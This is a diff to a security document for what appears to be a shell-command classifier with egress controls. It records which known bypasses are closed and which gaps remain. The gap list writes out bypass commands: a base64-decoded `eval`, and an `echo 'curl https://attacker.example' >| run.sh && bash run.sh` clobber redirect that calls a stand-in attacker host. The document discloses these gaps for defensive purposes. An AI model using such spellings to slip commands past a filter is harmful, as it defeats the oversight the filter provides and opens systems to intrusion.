@@ -295,10 +295,17 @@ single-label hosts plus raw IPv6 were ignored. The parser now understands these
 routing options, forwarding arguments, common shell prefixes/grouping,
 non-canonical numeric IP forms, and literal interpreter socket/DNS targets.
 
-The base64-decoded `eval` remains the one documented, unfixable-by-text bypass.
-In the live run it happened to fail only because `curl` is absent from the
-runtime image — luck, not the control. `node` **is** present, so the honest
-statement is that this class is closed only by network-layer egress control.
+The base64-decoded `eval` was for a long time the one documented,
+unfixable-by-text bypass; the capability layer now materialises what a named
+decoder would produce, so that particular spelling is closed. The general class
+is not: a payload the classifier cannot read is invisible to it by construction,
+and today's instance is a script written into a Makefile or git hook and run
+later. Closing that class *at the text layer* is not possible, which is why the
+project also built network-layer egress control — on the container runtime the
+destination is unreachable whether or not the classifier recognised the command
+([Current Security Model](../README.md#current-security-model)). That bounds the
+network half of the residual on that runtime; it does not make the command
+visible, and `RUNTIME_PROVIDER=local-process` has no such layer.
 
 ## Corpus integrity
 
@@ -331,8 +338,13 @@ bypass; the rest are gaps the fix waves left open on purpose, listed here so the
 are visible rather than buried in a diff:
 
 - `eval "$(echo <base64> | base64 -d)"` — the entire command is encoded, so
-  nothing incriminating is literal. This defeats any text-matching control and
-  is only fully addressed by network-layer egress restriction.
+  nothing incriminating is literal. This defeats any text-matching control on
+  its face; the engine now runs the decoder the command itself names and asks the
+  ordinary rules of the result, which closes this spelling. The class it stands
+  for — a payload the classifier cannot read — is fully addressed only by
+  network-layer egress restriction, which the container runtime provides and the
+  local-process runtime does not
+  ([Current Security Model](../README.md#current-security-model)).
 - `echo 'curl https://attacker.example' >| run.sh && bash run.sh` — the `>|`
   clobber redirect. `>|` was added to the capability layer's redirect scan, but
   not to `runsWrittenScript`'s sibling regex (`/>>?\s*([^\s;&|<>]+)/`), which
